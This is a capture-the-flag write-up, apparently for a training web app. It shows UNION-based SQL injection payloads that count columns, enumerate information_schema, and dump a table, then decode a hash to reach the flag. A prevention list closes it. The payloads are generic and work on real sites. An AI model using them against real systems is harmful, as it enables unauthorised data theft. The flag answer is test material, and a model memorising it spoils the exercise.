# SQL Injection Exploit Guide

## 1. Determine the Number of Columns

To begin exploiting SQL injection, you must first determine the number of columns returned by the query. Start by testing with a single column:

```sql
42 UNION SELECT null
```

If you receive the error "The used SELECT statements have a different number of columns," it indicates that there are more columns. Incrementally increase the number of `null` values until the query executes without error.

Test if there is two columns:

```sql
42 UNION SELECT null, null;
```

The query executes successfully, you know the correct number of columns is two.

## 2. Retrieve Table Schema and Types

Next, identify the schema and types of tables in the database. This is critical to understanding the structure of the database:

```sql
42 UNION SELECT table_schema, table_type FROM information_schema.tables
```

The results include schemas with base tables (those that hold actual data), such as `Member_Brute_Force`, `Member_Sql_Injection`, `Member_guestbook`, and `Member_images`.

## 3. Identify Table Names in Each Schema

To locate specific table names within these schemas, use:

```sql
42 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.columns
```

Exclude results related to the `information_schema` schema, as it does not contain user data. Focus on results like:

- `Member_Brute_Force/db_default`
- `Member_Sql_Injection/users`
- `Member_guestbook/guestbook`
- `Member_images/list_images`
- `Member_survey/vote_dbs`

For this exploit, we will focus on the `list_images` table in the `Member_images` schema.

## 4. Find Column Names in Tables

Retrieve the column names from the target table:

```sql
42 UNION SELECT table_name, column_name FROM information_schema.columns
```

This query reveals the specific columns available within the tables, such as `id`, `url`, `title`, and `comment` in the `Member_images.list_images` table.

## 5. Extract Data from Member_images.list_images Table

Now, extract data from the columns in the `Member_images.list_images` table. Start with the "id" and "url" columns:

```sql
42 UNION SELECT id, url FROM Member_images.list_images
```

Then, extract data from the "title" and "comment" columns:

```sql
42 UNION SELECT title, comment FROM Member_images.list_images
```

## 6. Decode the Final Flag

The final query returns data that includes instructions for obtaining the flag:

```sql
ID: 42 UNION SELECT title, comment FROM Member_images.list_images
First name: Hack me?
Surname: If you read this, use MD5 decoding (lowercase) and then SHA256 to obtain the flag: 1928e8083cf461a51303633093573c46
```

To decode:

1. Decode the MD5 hash `1928e8083cf461a51303633093573c46` to obtain `albatroz`.
2. Hash `albatroz` with SHA256 to yield the final flag:

`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Prevention

1. **Use Prepared Statements**: Prepared statements or parameterized queries separate SQL code from data, preventing SQL injection.
2. **Employ ORM Libraries**: Object-Relational Mapping (ORM) tools abstract away SQL and automatically handle input escaping.
3. **Escape User Inputs**: If you cannot use prepared statements, ensure user input is properly escaped.
4. **Validate and Sanitize Inputs**: Check user inputs against expected formats and sanitize them to remove harmful characters.
5. **Limit Database Privileges**: Apply the principle of least privilege, giving users only the permissions they absolutely need.
6. **Error Handling**: Show generic error messages to users and log detailed errors securely on the server.
7. **Regular Updates**: Regularly update your DBMS and libraries to protect against known vulnerabilities.

## Resources

- [Information Schema Tables](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/)
- [Information Schema Columns](https://www.mssqltips.com/sqlservertutorial/183/information-schema-columns/)
- [MD5 Encrypt/Decrypt](https://10015.io/tools/md5-encrypt-decrypt)
- [SHA256 Encrypt/Decrypt](https://10015.io/tools/sha256-encrypt-decrypt)
